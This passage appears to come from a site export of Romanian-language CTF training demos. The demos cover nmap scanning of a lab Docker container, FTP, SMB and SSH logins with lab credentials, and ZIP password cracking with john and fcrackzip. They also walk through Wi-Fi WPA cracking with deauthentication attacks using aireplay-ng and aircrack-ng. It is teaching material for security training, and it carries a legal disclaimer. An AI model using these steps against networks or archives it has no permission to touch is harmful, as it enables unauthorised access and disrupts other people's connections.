class=\"highlight plaintext\">Legal advice: don&#x27;t try to hack anything that you don&#x27;t own or don&#x27;t have explicit consent of.</code></pre>\n\n<blockquote>\n<p>Vom descrca un <strong>container</strong> tip <strong>Docker</strong>.<br><strong>Docker</strong> este folosit zilnic n dezvoltare i securitate pentru a crea medii izolate, replicabile.<br>Este popular n CTF-uri i teste de penetrare pentru simularea mediilor de reea.</p>\n</blockquote>\n<p><strong>1.2. Descrcarea unui container docker ales</strong></p>\n<blockquote>\n<p>Instalam programul <code>docker</code></p>\n</blockquote>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> apt update\n<span class=\"built_in\">sudo</span> apt install -y docker.io</code></pre>\n<blockquote>\n<p>Containerul se numete <code>ixo-network-recon</code>, versiunea <code>2.0</code><br>Extragem imaginea containerului </p>\n</blockquote>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> docker pull chronospkk/ixo-network-recon:2.0</code></pre>\n<blockquote>\n<p>Rulm container-ul </p>\n</blockquote>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> docker run -d --name ixo ixo-network-recon:2.0</code></pre>\n<blockquote>\n<p>Verificm execuia</p>\n</blockquote>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> docker ps</code></pre>\n\n<p><strong>1.3. Scanarea reelei interne cu un tool dedicat: <code>nmap</code></strong></p>\n<blockquote>\n<p>Identificm interfeele de reea (ale mainii virtuale)</p>\n</blockquote>\n<pre><code class=\"highlight bash\">ip a s\nifconfig</code></pre>\n<blockquote>\n<p>Scanm reeaua n care se afl containerul <code>Docker</code></p>\n</blockquote>\n<pre><code class=\"highlight bash\">nmap -sn -T4 172.17.0.1/24 -oN nmap.network</code></pre>\n<table>\n<thead>\n<tr>\n<th>Argument</th>\n<th>Descriere</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>-sn</code></td>\n<td>Nu scaneaz porturi</td>\n</tr>\n<tr>\n<td><code>-T4</code></td>\n<td>Scanare rapid (viteza 4&#x2F;5)</td>\n</tr>\n<tr>\n<td><code>172.17.0.1/24</code></td>\n<td>Reeaua int</td>\n</tr>\n<tr>\n<td><code>-oN nmap.network</code></td>\n<td>Salveaz rezultatul ntr-un fiier text</td>\n</tr>\n</tbody></table>\n<p><strong>1.4. Scanare mainii int</strong></p>\n<blockquote>\n<p>scanm containerul <code>Docker</code></p>\n</blockquote>\n<pre><code class=\"highlight bash\">nmap -Pn -T4 -sV -v 172.17.0.2 -oN nmap.host</code></pre>\n<table>\n<thead>\n<tr>\n<th>Argument</th>\n<th>Descriere</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>-Pn</code></td>\n<td>Nu ncerca <code>host discovery</code> (no ping)</td>\n</tr>\n<tr>\n<td><code>-T4</code></td>\n<td>Scanare rapid (viteza 4&#x2F;5)</td>\n</tr>\n<tr>\n<td><code>-sV</code></td>\n<td>Detectarea versiunii serviciilor</td>\n</tr>\n<tr>\n<td><code>-v</code></td>\n<td>Verbose output - afieaz mai multe detalii</td>\n</tr>\n<tr>\n<td><code>--max-retries 5</code></td>\n<td>Retransmite cererea de conectare doar de 5 ori (10 este default)</td>\n</tr>\n<tr>\n<td><code>172.17.0.2</code></td>\n<td>IP-ul int</td>\n</tr>\n<tr>\n<td><code>-oN nmap.host</code></td>\n<td>Salveaz rezultatul ntr-un fiier text</td>\n</tr>\n</tbody></table>\n<br>\n<br>\n\n\n<h2 id=\"2-Server-FTP\"><a href=\"#2-Server-FTP\" class=\"headerlink\" title=\"2. Server FTP\"></a>2. Server FTP</h2><blockquote>\n<p><strong>FTP</strong> (File Transfer Protocol) este un protocol vechi folosit pentru transferul de fiiere ntre client i server.<br>Este nc utilizat, n special pentru transferul fiierelor mari n infrastructuri care nu au adoptat alternative moderne (ex. <strong>SFTP</strong>).<br><strong>FTP</strong> poate permite acces anonim sau autentificat i este frecvent ntlnit n reele vechi sau nesecurizate.<br>Cu toate acestea, din cauza lipsei criptrii, este considerat nesigur.</p>\n</blockquote>\n<p><strong>Conectare anonim la serverul FTP</strong></p>\n<pre><div class=\"caption\"><span>1</span></div><code class=\"highlight bash\">ftp 172.17.0.2\n<span class=\"comment\"># Username: anonymous</span></code></pre>\n<pre><div class=\"caption\"><span>2</span></div><code class=\"highlight bash\">ftp anonymous@172.17.0.2</code></pre>\n\n\n<p><strong>Conectare autentificat la serverul FTP</strong></p>\n<pre><code class=\"highlight bash\">ftp ftp_user@172.17.0.2\n<span class=\"comment\">#Password: ftp_password_123!</span></code></pre>\n\n\n<br>\n<br>\n\n\n<h2 id=\"3-Server-SMB\"><a href=\"#3-Server-SMB\" class=\"headerlink\" title=\"3. Server SMB\"></a>3. Server SMB</h2><blockquote>\n<p><strong>SMB</strong> (Server Message Block) este folosit pentru partajarea fiierelor i imprimantelor n reelele locale, mai ales n reelele de birouri bazate pe Windows.<br>Acesta permite utilizatorilor s colaboreze pe aceleai fiiere din reea, oferind acces autenticat sau public la foldere i fiiere partajate.<br><strong>SMB</strong> este un protocol esenial n multe infrastructuri de dimensiuni mari.</p>\n</blockquote>\n<p><strong>3.1. Enumerarea automat a serverului SMB</strong></p>\n<pre><div class=\"caption\"><span>Ce foldere sunt partajate i ce acces avem la ele?</span></div><code class=\"highlight bash\">smbmap -H <span class=\"variable\">$IP</span></code></pre>\n\n<pre><div class=\"caption\"><span>La ce fiiere avem acces?</span></div><code class=\"highlight bash\">smbmap -H <span class=\"variable\">$IP</span> -r</code></pre>\n<pre><div class=\"caption\"><span>Specificm un folder pe care vrem s l enumerm</span></div><code class=\"highlight bash\">smbmap -H <span class=\"variable\">$IP</span> -r public\nsmbmap -H <span class=\"variable\">$IP</span> -r private</code></pre>\n<pre><div class=\"caption\"><span>Enumerare automat cu autentificare</span></div><code class=\"highlight bash\">smbmap -H <span class=\"variable\">$IP</span> -u smb_user -p <span class=\"string\">&#x27;smb_password_123!&#x27;</span>\nsmbmap -H <span class=\"variable\">$IP</span> -u smb_user -p <span class=\"string\">&#x27;smb_password_123!&#x27;</span> -r</code></pre>\n\n<br>\n\n<p><strong>3.2. Conectare anonim la serverul SMB</strong></p>\n<pre><div class=\"caption\"><span>Conectare la serverul SMB</span></div><code class=\"highlight bash\">smbclient -N //172.17.0.2/public</code></pre>\n\n<br>\n\n<p><strong>3.2. Conectare autentificat la serverul SMB</strong></p>\n<pre><div class=\"caption\"><span>Conectare la serverul SMB</span></div><code class=\"highlight bash\">smbclient //172.17.0.2/private -U smb_user%<span class=\"string\">&#x27;smb_password_123!&#x27;</span></code></pre>\n\n<br>\n\n<h2 id=\"4-Server-SSH\"><a href=\"#4-Server-SSH\" class=\"headerlink\" title=\"4. Server SSH\"></a>4. Server SSH</h2><blockquote>\n<p><strong>SSH</strong> (Secure Shell) este protocolul standard pentru acces securizat la servere de la distan.<br><strong>SSH</strong> este criptat i ofer autentificare prin parole sau chei publice&#x2F;private, fiind folosit n mod obinuit pentru administrarea serverelor.<br>Este esenial pentru sysadmini i devops, fiind folosit zilnic pentru accesul la servere sau la maini virtuale.</p>\n</blockquote>\n<pre><div class=\"caption\"><span>Conectare la serverul SSH</span></div><code class=\"highlight bash\">ssh ssh_user@172.17.0.2\n<span class=\"comment\"># Password: ssh_password_123!</span></code></pre>\n\n<br>\n<br>\n\n<p style=\"text-align:center\">\n  <b>NEXT</b>: <a href=\"/CTFs/ixodron/Demo/2/\" target=\"_blank\">Demo 2</a>\n</p>\n\n<hr>\n<hr>\n","excerpt":"<hr>\n<blockquote>\n<p>Primul set de exerciii din seria de <code>Demo</code>-uri</p>\n</blockquote>\n<hr>","more":"<br>\n\n<h2 id=\"1-Scanarea-retelei\"><a href=\"#1-Scanarea-retelei\" class=\"headerlink\" title=\"1. Scanarea reelei\"></a>1. Scanarea reelei</h2><blockquote>\n<p>n aceast etap, vom folosi comanda <code>nmap</code> pentru a descoperi ce servicii ruleaz pe containerul <strong>Docker</strong> descrcat. Vom afla ce porturi sunt deschise i ce servicii sunt active, cum ar fi <strong>FTP</strong>, <strong>SMB</strong> i <strong>SSH</strong>.</p>\n</blockquote>\n<p><strong>1.1. Alegerea reelei</strong></p>\n<pre><code class=\"highlight plaintext\">Legal advice: don&#x27;t try to hack anything that you don&#x27;t own or don&#x27;t have explicit consent of.</code></pre>\n\n<blockquote>\n<p>Vom descrca un <strong>container</strong> tip <strong>Docker</strong>.<br><strong>Docker</strong> este folosit zilnic n dezvoltare i securitate pentru a crea medii izolate, replicabile.<br>Este popular n CTF-uri i teste de penetrare pentru simularea mediilor de reea.</p>\n</blockquote>\n<p><strong>1.2. Descrcarea unui container docker ales</strong></p>\n<blockquote>\n<p>Instalam programul <code>docker</code></p>\n</blockquote>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> apt update\n<span class=\"built_in\">sudo</span> apt install -y docker.io</code></pre>\n<blockquote>\n<p>Containerul se numete <code>ixo-network-recon</code>, versiunea <code>2.0</code><br>Extragem imaginea containerului </p>\n</blockquote>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> docker pull chronospkk/ixo-network-recon:2.0</code></pre>\n<blockquote>\n<p>Rulm container-ul </p>\n</blockquote>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> docker run -d --name ixo ixo-network-recon:2.0</code></pre>\n<blockquote>\n<p>Verificm execuia</p>\n</blockquote>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> docker ps</code></pre>\n\n<p><strong>1.3. Scanarea reelei interne cu un tool dedicat: <code>nmap</code></strong></p>\n<blockquote>\n<p>Identificm interfeele de reea (ale mainii virtuale)</p>\n</blockquote>\n<pre><code class=\"highlight bash\">ip a s\nifconfig</code></pre>\n<blockquote>\n<p>Scanm reeaua n care se afl containerul <code>Docker</code></p>\n</blockquote>\n<pre><code class=\"highlight bash\">nmap -sn -T4 172.17.0.1/24 -oN nmap.network</code></pre>\n<table>\n<thead>\n<tr>\n<th>Argument</th>\n<th>Descriere</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>-sn</code></td>\n<td>Nu scaneaz porturi</td>\n</tr>\n<tr>\n<td><code>-T4</code></td>\n<td>Scanare rapid (viteza 4&#x2F;5)</td>\n</tr>\n<tr>\n<td><code>172.17.0.1/24</code></td>\n<td>Reeaua int</td>\n</tr>\n<tr>\n<td><code>-oN nmap.network</code></td>\n<td>Salveaz rezultatul ntr-un fiier text</td>\n</tr>\n</tbody></table>\n<p><strong>1.4. Scanare mainii int</strong></p>\n<blockquote>\n<p>scanm containerul <code>Docker</code></p>\n</blockquote>\n<pre><code class=\"highlight bash\">nmap -Pn -T4 -sV -v 172.17.0.2 -oN nmap.host</code></pre>\n<table>\n<thead>\n<tr>\n<th>Argument</th>\n<th>Descriere</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>-Pn</code></td>\n<td>Nu ncerca <code>host discovery</code> (no ping)</td>\n</tr>\n<tr>\n<td><code>-T4</code></td>\n<td>Scanare rapid (viteza 4&#x2F;5)</td>\n</tr>\n<tr>\n<td><code>-sV</code></td>\n<td>Detectarea versiunii serviciilor</td>\n</tr>\n<tr>\n<td><code>-v</code></td>\n<td>Verbose output - afieaz mai multe detalii</td>\n</tr>\n<tr>\n<td><code>--max-retries 5</code></td>\n<td>Retransmite cererea de conectare doar de 5 ori (10 este default)</td>\n</tr>\n<tr>\n<td><code>172.17.0.2</code></td>\n<td>IP-ul int</td>\n</tr>\n<tr>\n<td><code>-oN nmap.host</code></td>\n<td>Salveaz rezultatul ntr-un fiier text</td>\n</tr>\n</tbody></table>\n<br>\n<br>\n\n\n<h2 id=\"2-Server-FTP\"><a href=\"#2-Server-FTP\" class=\"headerlink\" title=\"2. Server FTP\"></a>2. Server FTP</h2><blockquote>\n<p><strong>FTP</strong> (File Transfer Protocol) este un protocol vechi folosit pentru transferul de fiiere ntre client i server.<br>Este nc utilizat, n special pentru transferul fiierelor mari n infrastructuri care nu au adoptat alternative moderne (ex. <strong>SFTP</strong>).<br><strong>FTP</strong> poate permite acces anonim sau autentificat i este frecvent ntlnit n reele vechi sau nesecurizate.<br>Cu toate acestea, din cauza lipsei criptrii, este considerat nesigur.</p>\n</blockquote>\n<p><strong>Conectare anonim la serverul FTP</strong></p>\n<pre><div class=\"caption\"><span>1</span></div><code class=\"highlight bash\">ftp 172.17.0.2\n<span class=\"comment\"># Username: anonymous</span></code></pre>\n<pre><div class=\"caption\"><span>2</span></div><code class=\"highlight bash\">ftp anonymous@172.17.0.2</code></pre>\n\n\n<p><strong>Conectare autentificat la serverul FTP</strong></p>\n<pre><code class=\"highlight bash\">ftp ftp_user@172.17.0.2\n<span class=\"comment\">#Password: ftp_password_123!</span></code></pre>\n\n\n<br>\n<br>\n\n\n<h2 id=\"3-Server-SMB\"><a href=\"#3-Server-SMB\" class=\"headerlink\" title=\"3. Server SMB\"></a>3. Server SMB</h2><blockquote>\n<p><strong>SMB</strong> (Server Message Block) este folosit pentru partajarea fiierelor i imprimantelor n reelele locale, mai ales n reelele de birouri bazate pe Windows.<br>Acesta permite utilizatorilor s colaboreze pe aceleai fiiere din reea, oferind acces autenticat sau public la foldere i fiiere partajate.<br><strong>SMB</strong> este un protocol esenial n multe infrastructuri de dimensiuni mari.</p>\n</blockquote>\n<p><strong>3.1. Enumerarea automat a serverului SMB</strong></p>\n<pre><div class=\"caption\"><span>Ce foldere sunt partajate i ce acces avem la ele?</span></div><code class=\"highlight bash\">smbmap -H <span class=\"variable\">$IP</span></code></pre>\n\n<pre><div class=\"caption\"><span>La ce fiiere avem acces?</span></div><code class=\"highlight bash\">smbmap -H <span class=\"variable\">$IP</span> -r</code></pre>\n<pre><div class=\"caption\"><span>Specificm un folder pe care vrem s l enumerm</span></div><code class=\"highlight bash\">smbmap -H <span class=\"variable\">$IP</span> -r public\nsmbmap -H <span class=\"variable\">$IP</span> -r private</code></pre>\n<pre><div class=\"caption\"><span>Enumerare automat cu autentificare</span></div><code class=\"highlight bash\">smbmap -H <span class=\"variable\">$IP</span> -u smb_user -p <span class=\"string\">&#x27;smb_password_123!&#x27;</span>\nsmbmap -H <span class=\"variable\">$IP</span> -u smb_user -p <span class=\"string\">&#x27;smb_password_123!&#x27;</span> -r</code></pre>\n\n<br>\n\n<p><strong>3.2. Conectare anonim la serverul SMB</strong></p>\n<pre><div class=\"caption\"><span>Conectare la serverul SMB</span></div><code class=\"highlight bash\">smbclient -N //172.17.0.2/public</code></pre>\n\n<br>\n\n<p><strong>3.2. Conectare autentificat la serverul SMB</strong></p>\n<pre><div class=\"caption\"><span>Conectare la serverul SMB</span></div><code class=\"highlight bash\">smbclient //172.17.0.2/private -U smb_user%<span class=\"string\">&#x27;smb_password_123!&#x27;</span></code></pre>\n\n<br>\n\n<h2 id=\"4-Server-SSH\"><a href=\"#4-Server-SSH\" class=\"headerlink\" title=\"4. Server SSH\"></a>4. Server SSH</h2><blockquote>\n<p><strong>SSH</strong> (Secure Shell) este protocolul standard pentru acces securizat la servere de la distan.<br><strong>SSH</strong> este criptat i ofer autentificare prin parole sau chei publice&#x2F;private, fiind folosit n mod obinuit pentru administrarea serverelor.<br>Este esenial pentru sysadmini i devops, fiind folosit zilnic pentru accesul la servere sau la maini virtuale.</p>\n</blockquote>\n<pre><div class=\"caption\"><span>Conectare la serverul SSH</span></div><code class=\"highlight bash\">ssh ssh_user@172.17.0.2\n<span class=\"comment\"># Password: ssh_password_123!</span></code></pre>\n\n<br>\n<br>\n\n<p style=\"text-align:center\">\n  <b>NEXT</b>: <a href=\"/CTFs/ixodron/Demo/2/\" target=\"_blank\">Demo 2</a>\n</p>\n\n<hr>\n<hr>"},{"title":"ixodron 2024 - Demo 2","date":"2024-09-03T06:00:00.000Z","toc":true,"_content":"\n---\n> Al doilea set de exerciii din seria de `Demo`-uri\n\n---\n<!-- more -->\n\n<br>\n\n## 1. Server web\n> Executarea unor teste de securitate de baz pe un server web pentru a-i nelege caracteristicile\n\n**1.1. Codul surs**\nDeschide pagina n browser la adresa `https://chronossec.site`\nVezi codul surs: `click-dreapta`, `View page source`\n\n> **TASK**: Ce generator de site este folosit? Ce versiune este? (cuvinte cheie: `generator`, `version`)\n\n<br>\n\n**1.2. Developer tools - network tab**\n\nDeschide Developer Tools: `Fn + F12` sau `CTRL+SHIFT+I`\nSelecteaz `Network Tab`\nRencarc pagina pentru a vedea traficul de date: `CTRL+R`\n\n> **TASK**: Selecteaz doar imagini i salveaz logo-ul paginii.\n\n<br>\n\n**1.3. Developer tools - storage tab**\n\nDeschide Developer Tools: `Fn + F12` sau `CTRL+SHIFT+I`\nSelecteaz `Storage`\nVezi seciunea de `Cookies`\n\n> **TASK**: terge cookie-urile din browser.\n\n<br>\n\n**1.4. Certificat SSL**\n\nIconia cu lact \n`Connection secure`\n`More information`\n`View certificate`\n\n> **TASK**: Care este utilizarea cheii? (`Key usage`)\n\n\n<br>\n<br>\n\n\n## 2. Parole personalizate\n> Crearea unor liste de parole personalizate pentru inta atacului\n\n```bash\nmkdir -p /home/kali/demo-1/wordlist/\ncd /home/kali/demo-1/wordlist/\n```\n\n**Instaleaz aplicaia `cewl`**\n```bash\nsudo apt install cewl -y\ncewl --help\n```\n\n**Generarea unei liste de parole personalizate pentru site-ul web ales**\n```bash\ncewl https://chronossec.site -w wordlist.txt -m 5 -d 1 -v\n```\n| Argument  | Descriere |\n| -- | -- |\n| `-w wordlist.txt` | numele fisierului ce va fi generat |\n| `-m 5` | numarul minim de caractere al cuvintelor selectate |\n| `-d 1` | depth - adancimea linkurilor verificate |\n| `-v` | verbose - detalii despre process |\n\n**Verificarea listei de parole generate**\n```bash\ncat wordlist.txt\nwc -l wordlist.txt\n```\n\n\n<br>\n<br>\n\n\n## 3. Arhiva ZIP\n```bash\nmkdir -p /home/kali/demo-1/archive\ncd /home/kali/demo-1/archive\n```\n> Spargerea unei arhive protejate cu parol\n**Descarc fiierul: <a href=\"https://chronossec.site/uploads/ixodron-ctf/demo-1/archive.zip\" target=\"_blank\">link</a>.**\n```bash\nwget https://chronossec.site/uploads/ixodron-ctf/demo-1/archive.zip /home/kali/demo-1/archive/archive.zip\n```\n\n**Extrage lista extensiv de parole, `rockyou.txt`**\n```bash\nsudo gzip -d /usr/share/wordlists/rockyou.txt.gz\n```\n\n**Sparge parola**\n\n- `Metoda 1`\n> Folosim `zip2john` pentru a converti parola arhivei ntr-un format compatibil cu `john`.\n```bash\nzip2john archive.zip > hash.txt\njohn hash.txt --wordlist=/usr/share/wordlists/rockyou.txt\n```\n\n- `Metoda 2`\n> Utilizm `fcrackzip` pentru atac de dicionar direct asupra arhivei.\n```bash\nsudo apt install -y fcrackzip\n```\n```bash\nfcrackzip -D -v -u -p /usr/share/wordlists/rockyou.txt archive.zip\n```\n| Argument | Descriere|\n| -- | -- |\n| `-D` | atac tip Dicionar |\n| `-v` | mai multe informaii (verbos) |\n| `-u` | ncearc s dezarhiveze cu fiecare parol generat |\n| `-p` | fiierul cu lista de parole |\n\n**Extrage fierul** (nlocuiete parola gsit)\n```bash\nunzip -P password archive.zip\n```\n\n\n<br>\n<br>\n\n\n## 4. Wi-Fi\n> Spargerea parolei unei reele Wi-Fi protejate\n\n**4.1. Inserarea adaptorului de reea (antena)**\n<br>\n\n**4.2. Configurarea interfeei de reea**\n```bash\nsudo ifconfig wlan0 down\nsudo iwconfig wlan0 mode monitor\nsudo ifconfig wlan0 down\niwconfig\n```\n```bash\nsudo airmon-ng start wlan0\nairmon-ng check kill\n```\n\n**4.3.Alegerea reelei i clientului int**\n```bash\nsudo airodump-ng wlan0\n```\n```\nsudo airodump-ng --bssid <INPUT> --channel <INPUT> --write capturefile wlan0\n```\n\n**4.4. Deauthentificarea clientului de la reea**\n> Dac trimitem un numr mic de pachete de deautentificare, clientul nu-i va da seama c a fost deconectat, \n    iar noi vom putea intercepta direct parola criptat trimis de acesta ctre router (access point)\n```bash\nsudo aireplay-ng --deauth 4 -a <target_MAC> -c <client_MAC> wlan0\n```\n\n**4.5. Spargerea parolei criptate**\n```bash\nsudo aircrack-ng capturefile.cap -w /usr/share/wordlist/rockyou.txt\n```\n\n<br>\n<br>\n\n<p style=\"text-align:center\">\n  <b>NEXT</b>: <a href=\"/CTFs/ixodron/ctf/\" target=\"_blank\">CTF</a>\n</p>\n\n---\n---","source":"_posts/CTFs/ixodron/Demo/2.md","raw":"---\ntitle: ixodron 2024 - Demo 2\ndate: 2024-09-03 09:00:00\ncategories:\n  - CTFs\n  - ixodron 2024\n  - 2. Demo\ntags:\n  - CTFs\n  - ixodron 2024\n  - Demo\ntoc: true\n---\n\n---\n> Al doilea set de exerciii din seria de `Demo`-uri\n\n---\n<!-- more -->\n\n<br>\n\n## 1. Server web\n> Executarea unor teste de securitate de baz pe un server web pentru a-i nelege caracteristicile\n\n**1.1. Codul surs**\nDeschide pagina n browser la adresa `https://chronossec.site`\nVezi codul surs: `click-dreapta`, `View page source`\n\n> **TASK**: Ce generator de site este folosit? Ce versiune este? (cuvinte cheie: `generator`, `version`)\n\n<br>\n\n**1.2. Developer tools - network tab**\n\nDeschide Developer Tools: `Fn + F12` sau `CTRL+SHIFT+I`\nSelecteaz `Network Tab`\nRencarc pagina pentru a vedea traficul de date: `CTRL+R`\n\n> **TASK**: Selecteaz doar imagini i salveaz logo-ul paginii.\n\n<br>\n\n**1.3. Developer tools - storage tab**\n\nDeschide Developer Tools: `Fn + F12` sau `CTRL+SHIFT+I`\nSelecteaz `Storage`\nVezi seciunea de `Cookies`\n\n> **TASK**: terge cookie-urile din browser.\n\n<br>\n\n**1.4. Certificat SSL**\n\nIconia cu lact \n`Connection secure`\n`More information`\n`View certificate`\n\n> **TASK**: Care este utilizarea cheii? (`Key usage`)\n\n\n<br>\n<br>\n\n\n## 2. Parole personalizate\n> Crearea unor liste de parole personalizate pentru inta atacului\n\n```bash\nmkdir -p /home/kali/demo-1/wordlist/\ncd /home/kali/demo-1/wordlist/\n```\n\n**Instaleaz aplicaia `cewl`**\n```bash\nsudo apt install cewl -y\ncewl --help\n```\n\n**Generarea unei liste de parole personalizate pentru site-ul web ales**\n```bash\ncewl https://chronossec.site -w wordlist.txt -m 5 -d 1 -v\n```\n| Argument  | Descriere |\n| -- | -- |\n| `-w wordlist.txt` | numele fisierului ce va fi generat |\n| `-m 5` | numarul minim de caractere al cuvintelor selectate |\n| `-d 1` | depth - adancimea linkurilor verificate |\n| `-v` | verbose - detalii despre process |\n\n**Verificarea listei de parole generate**\n```bash\ncat wordlist.txt\nwc -l wordlist.txt\n```\n\n\n<br>\n<br>\n\n\n## 3. Arhiva ZIP\n```bash\nmkdir -p /home/kali/demo-1/archive\ncd /home/kali/demo-1/archive\n```\n> Spargerea unei arhive protejate cu parol\n**Descarc fiierul: <a href=\"https://chronossec.site/uploads/ixodron-ctf/demo-1/archive.zip\" target=\"_blank\">link</a>.**\n```bash\nwget https://chronossec.site/uploads/ixodron-ctf/demo-1/archive.zip /home/kali/demo-1/archive/archive.zip\n```\n\n**Extrage lista extensiv de parole, `rockyou.txt`**\n```bash\nsudo gzip -d /usr/share/wordlists/rockyou.txt.gz\n```\n\n**Sparge parola**\n\n- `Metoda 1`\n> Folosim `zip2john` pentru a converti parola arhivei ntr-un format compatibil cu `john`.\n```bash\nzip2john archive.zip > hash.txt\njohn hash.txt --wordlist=/usr/share/wordlists/rockyou.txt\n```\n\n- `Metoda 2`\n> Utilizm `fcrackzip` pentru atac de dicionar direct asupra arhivei.\n```bash\nsudo apt install -y fcrackzip\n```\n```bash\nfcrackzip -D -v -u -p /usr/share/wordlists/rockyou.txt archive.zip\n```\n| Argument | Descriere|\n| -- | -- |\n| `-D` | atac tip Dicionar |\n| `-v` | mai multe informaii (verbos) |\n| `-u` | ncearc s dezarhiveze cu fiecare parol generat |\n| `-p` | fiierul cu lista de parole |\n\n**Extrage fierul** (nlocuiete parola gsit)\n```bash\nunzip -P password archive.zip\n```\n\n\n<br>\n<br>\n\n\n## 4. Wi-Fi\n> Spargerea parolei unei reele Wi-Fi protejate\n\n**4.1. Inserarea adaptorului de reea (antena)**\n<br>\n\n**4.2. Configurarea interfeei de reea**\n```bash\nsudo ifconfig wlan0 down\nsudo iwconfig wlan0 mode monitor\nsudo ifconfig wlan0 down\niwconfig\n```\n```bash\nsudo airmon-ng start wlan0\nairmon-ng check kill\n```\n\n**4.3.Alegerea reelei i clientului int**\n```bash\nsudo airodump-ng wlan0\n```\n```\nsudo airodump-ng --bssid <INPUT> --channel <INPUT> --write capturefile wlan0\n```\n\n**4.4. Deauthentificarea clientului de la reea**\n> Dac trimitem un numr mic de pachete de deautentificare, clientul nu-i va da seama c a fost deconectat, \n    iar noi vom putea intercepta direct parola criptat trimis de acesta ctre router (access point)\n```bash\nsudo aireplay-ng --deauth 4 -a <target_MAC> -c <client_MAC> wlan0\n```\n\n**4.5. Spargerea parolei criptate**\n```bash\nsudo aircrack-ng capturefile.cap -w /usr/share/wordlist/rockyou.txt\n```\n\n<br>\n<br>\n\n<p style=\"text-align:center\">\n  <b>NEXT</b>: <a href=\"/CTFs/ixodron/ctf/\" target=\"_blank\">CTF</a>\n</p>\n\n---\n---","slug":"CTFs/ixodron/Demo/2","published":1,"updated":"2024-09-23T06:18:55.848Z","comments":1,"layout":"post","photos":[],"_id":"cm1emkmih002y6gvghs1o69x1","content":"<hr>\n<blockquote>\n<p>Al doilea set de exerciii din seria de <code>Demo</code>-uri</p>\n</blockquote>\n<hr>\n<span id=\"more\"></span>\n\n<br>\n\n<h2 id=\"1-Server-web\"><a href=\"#1-Server-web\" class=\"headerlink\" title=\"1. Server web\"></a>1. Server web</h2><blockquote>\n<p>Executarea unor teste de securitate de baz pe un server web pentru a-i nelege caracteristicile</p>\n</blockquote>\n<p><strong>1.1. Codul surs</strong><br>Deschide pagina n browser la adresa <code>https://chronossec.site</code><br>Vezi codul surs: <code>click-dreapta</code>, <code>View page source</code></p>\n<blockquote>\n<p><strong>TASK</strong>: Ce generator de site este folosit? Ce versiune este? (cuvinte cheie: <code>generator</code>, <code>version</code>)</p>\n</blockquote>\n<br>\n\n<p><strong>1.2. Developer tools - network tab</strong></p>\n<p>Deschide Developer Tools: <code>Fn + F12</code> sau <code>CTRL+SHIFT+I</code><br>Selecteaz <code>Network Tab</code><br>Rencarc pagina pentru a vedea traficul de date: <code>CTRL+R</code></p>\n<blockquote>\n<p><strong>TASK</strong>: Selecteaz doar imagini i salveaz logo-ul paginii.</p>\n</blockquote>\n<br>\n\n<p><strong>1.3. Developer tools - storage tab</strong></p>\n<p>Deschide Developer Tools: <code>Fn + F12</code> sau <code>CTRL+SHIFT+I</code><br>Selecteaz <code>Storage</code><br>Vezi seciunea de <code>Cookies</code></p>\n<blockquote>\n<p><strong>TASK</strong>: terge cookie-urile din browser.</p>\n</blockquote>\n<br>\n\n<p><strong>1.4. Certificat SSL</strong></p>\n<p>Iconia cu lact <br><code>Connection secure</code><br><code>More information</code><br><code>View certificate</code></p>\n<blockquote>\n<p><strong>TASK</strong>: Care este utilizarea cheii? (<code>Key usage</code>)</p>\n</blockquote>\n<br>\n<br>\n\n\n<h2 id=\"2-Parole-personalizate\"><a href=\"#2-Parole-personalizate\" class=\"headerlink\" title=\"2. Parole personalizate\"></a>2. Parole personalizate</h2><blockquote>\n<p>Crearea unor liste de parole personalizate pentru inta atacului</p>\n</blockquote>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">mkdir</span> -p /home/kali/demo-1/wordlist/\n<span class=\"built_in\">cd</span> /home/kali/demo-1/wordlist/</code></pre>\n\n<p><strong>Instaleaz aplicaia <code>cewl</code></strong></p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> apt install cewl -y\ncewl --<span class=\"built_in\">help</span></code></pre>\n\n<p><strong>Generarea unei liste de parole personalizate pentru site-ul web ales</strong></p>\n<pre><code class=\"highlight bash\">cewl https://chronossec.site -w wordlist.txt -m 5 -d 1 -v</code></pre>\n<table>\n<thead>\n<tr>\n<th>Argument</th>\n<th>Descriere</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>-w wordlist.txt</code></td>\n<td>numele fisierului ce va fi generat</td>\n</tr>\n<tr>\n<td><code>-m 5</code></td>\n<td>numarul minim de caractere al cuvintelor selectate</td>\n</tr>\n<tr>\n<td><code>-d 1</code></td>\n<td>depth - adancimea linkurilor verificate</td>\n</tr>\n<tr>\n<td><code>-v</code></td>\n<td>verbose - detalii despre process</td>\n</tr>\n</tbody></table>\n<p><strong>Verificarea listei de parole generate</strong></p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">cat</span> wordlist.txt\n<span class=\"built_in\">wc</span> -l wordlist.txt</code></pre>\n\n\n<br>\n<br>\n\n\n<h2 id=\"3-Arhiva-ZIP\"><a href=\"#3-Arhiva-ZIP\" class=\"headerlink\" title=\"3. Arhiva ZIP\"></a>3. Arhiva ZIP</h2><pre><code class=\"highlight bash\"><span class=\"built_in\">mkdir</span> -p /home/kali/demo-1/archive\n<span class=\"built_in\">cd</span> /home/kali/demo-1/archive</code></pre>\n<blockquote>\n<p>Spargerea unei arhive protejate cu parol<br><strong>Descarc fiierul: <a href=\"https://chronossec.site/uploads/ixodron-ctf/demo-1/archive.zip\" target=\"_blank\">link</a>.</strong></p>\n</blockquote>\n<pre><code class=\"highlight bash\">wget https://chronossec.site/uploads/ixodron-ctf/demo-1/archive.zip /home/kali/demo-1/archive/archive.zip</code></pre>\n\n<p><strong>Extrage lista extensiv de parole, <code>rockyou.txt</code></strong></p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> gzip -d /usr/share/wordlists/rockyou.txt.gz</code></pre>\n\n<p><strong>Sparge 